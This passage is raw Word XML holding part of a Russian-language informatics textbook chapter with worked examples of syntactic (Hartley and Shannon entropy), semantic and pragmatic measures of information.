    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(33) ≈ 5.044 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Каждая буква несёт примерно 5.044 бита информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Английский алфавит (26 букв):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(26) ≈ 4.700 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Информация в растровом изображении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чёрно-белое изображение 100×100 пикселей, каждый пиксель может быть чёрным или белым.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Количество пикселей: 100 × 100 = 10 000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Каждый пиксель несёт 1 бит информации (2 варианта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Общее количество информации: 10 000 бит = 1 250 байт ≈ 1.22 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если изображение 256 градаций серого (8 бит на пиксель):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I_пиксель = log₂(256) = 8 бит</w:t>
        <w:br/>
        <w:t>I_общая = 10 000 × 8 = 80 000 бит = 10 000 байт ≈ 9.77 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры расчётов по формуле Шеннона</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Неравновероятные исходы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Имеется источник, который выдаёт три символа: A, B, C с вероятностями:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>p(A) = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>p(B) = 0.25</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>p(C) = 0.25</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Энтропия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>H = -(0.5 × log₂(0.5) + 0.25 × log₂(0.25) + 0.25 × log₂(0.25))</w:t>
        <w:br/>
        <w:t>H = -(0.5 × (-1) + 0.25 × (-2) + 0.25 × (-2))</w:t>
        <w:br/>
        <w:t>H = -(-0.5 - 0.5 - 0.5) = 1.5 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Средняя информация на символ — 1.5 бита. Это меньше, чем для трёх равновероятных символов (log₂(3) ≈ 1.585 бита), так как символ A более предсказуем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Энтропия русского текста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исследования показывают, что в русском языке буквы встречаются с разной частотой:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буква "О" — около 10.97%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буква "Е" — около 8.45%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буква "А" — около 8.01%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буква "Ф" — около 0.26%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буква "Щ" — около 0.06%</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если бы все 33 буквы были равновероятны, энтропия была бы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>H_макс = log₂(33) ≈ 5.044 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Но с учётом реальных частот, энтропия русского текста составляет примерно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>H_реальная ≈ 4.35 бита на символ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это означает, что русский текст более предсказуем, чем случайная последовательность букв, что используется алгоритмами сжатия (глава 1.12).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 8:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Информация в сообщении о выигрыше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вы участвуете в лотерее, где вероятность выигрыша 1%, а проигрыша 99%.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если вам сообщили, что вы выиграли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I_выигрыш = -log₂(0.01) = log₂(100) ≈ 6.644 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если сообщили, что проиграли:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I_проигрыш = -log₂(0.99) ≈ 0.0145 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сообщение о редком событии (выигрыше) несёт гораздо больше информации, чем сообщение о ожидаемом событии (проигрыше).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая мера информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение и сущность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Семантическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это подход к измерению информации, при котором учитывается </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>смысловое содержание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сообщения, его </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>содержательность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>новизна</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>С семантической точки зрения одно и то же сообщение может содержать разное количество информации для разных получателей в зависимости от их предварительных знаний.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые аспекты семантической меры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Новизна** — сообщение содержит информацию только если оно сообщает нечто новое</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Понятность** — получатель должен понимать содержание сообщения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Контекст** — смысл зависит от контекста и знаний получателя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Достоверность** — ложная информация снижает семантическую ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Принцип семантической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Семантическая мера может быть представлена как отношение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ic = Iтезаурус / Iсообщение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ic** — семантическая мера информации (содержательность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Iтезаурус** — информация, соответствующая знаниям получателя (тезаурус)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Iсообщение** — информация в сообщении</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тезаурус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это совокупность знаний, которыми обладает получатель информации в данной предметной области.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Зависимость от тезауруса получателя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Семантическая ценность информации зависит от соотношения тезауруса получателя и сложности сообщения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тезаурус слишком мал** (получатель не понимает терминологию):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сообщение непонятно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая ценность близка к нулю</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: научная статья по квантовой физике для школьника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тезаурус оптимален** (соответствует уровню сообщения):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сообщение понятно и содержит новые знания</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальная семантическая ценность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: учебник для студента соответствующего курса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тезаурус слишком велик** (получатель уже всё знает):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сообщение не содержит новой информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая ценность близка к нулю</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: учебник для начальных классов для профессора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры семантической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 9:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Прогноз погоды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Синтаксически: сообщение "Завтра будет дождь" содержит около 150 бит (примерно 19 символов × 8 бит).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Семантически:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для человека, планирующего пикник — **высокая ценность** (влияет на планы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для человека, работающего в офисе — **средняя ценность**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для человека, уже знающего прогноз — **нулевая ценность** (нет новизны)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 10:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Учебная информация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Фраза "Квадрат гипотенузы равен сумме квадратов катетов":</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для ученика 5 класса:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Непонятна (недостаточный тезаурус)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая ценность ≈ 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для ученика 8 класса, изучающего теорему Пифагора:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Новая и понятная информация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальная семантическая ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для студента математического факультета:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Давно известная информация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая ценность ≈ 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 11:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Новостное сообщение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Новость "Открыт новый элемент с атомным номером 119":</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для учёного-химика:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Революционная новость</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Очень высокая семантическая ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для обычного человека:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Умеренная ценность (интересно, но не применимо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для человека, не интересующегося наукой:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Низкая семантическая ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 12:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дублирование информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Первое упоминание: "Столица Франции — Париж"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для не знающего — высокая семантическая ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Второе упоминание той же информации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семантическая ценность = 0 (нет новизны)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хотя синтаксически оба сообщения одинаковы, семантически второе не несёт информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Прагматическая мера информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение и сущность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прагматическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это подход к измерению информации с точки зрения её </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>полезности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ценности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>влияния на достижение цели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> получателя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Прагматическая мера оценивает не просто смысл информации, а её </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>практическую значимость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для конкретного получателя в конкретной ситуации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые аспекты прагматической меры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Целесообразность** — насколько информация помогает достичь цели</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Своевременность** — информация ценна в нужный момент времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полнота** — достаточность информации для принятия решения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Достоверность** — надёжность информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Актуальность** — соответствие текущей ситуации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формализация прагматической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прагматическую меру можно выразить через изменение вероятности достижения цели:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ip = P(после) - P(до)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ip** — прагматическая мера информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**P(после)** — вероятность достижения цели после получения информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**P(до)** — вероятность достижения цели до получения информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чем больше информация увеличивает вероятность достижения цели, тем она ценнее с прагматической точки зрения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Факторы прагматической ценности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы, увеличивающие прагматическую ценность:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Актуальность для текущих задач</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возможность практического применения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Влияние на принятие важных решений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Своевременность получения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Достоверность источника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факторы, снижающие прагматическую ценность:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Устаревшая информация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нерелевантная для целей получателя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Недостоверная или неполная информация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Избыточная информация (информационная перегрузка)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры прагматической меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 13:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Информация о ДТП на дороге</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сообщение: "На шоссе М1 произошло ДТП, образовалась пробка"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Синтаксически: около 400 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Семантически: понятно всем водителям</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прагматически:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для водителя, едущего по М1** — очень высокая ценность (позволит выбрать объездной путь, сэкономит часы времени)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для водителя в другом городе** — нулевая ценность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для пешехода** — нулевая ценность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 14:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Биржевая информация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация: "Акции компании X выросли на 15%"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для инвестора, владеющего акциями компании X:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
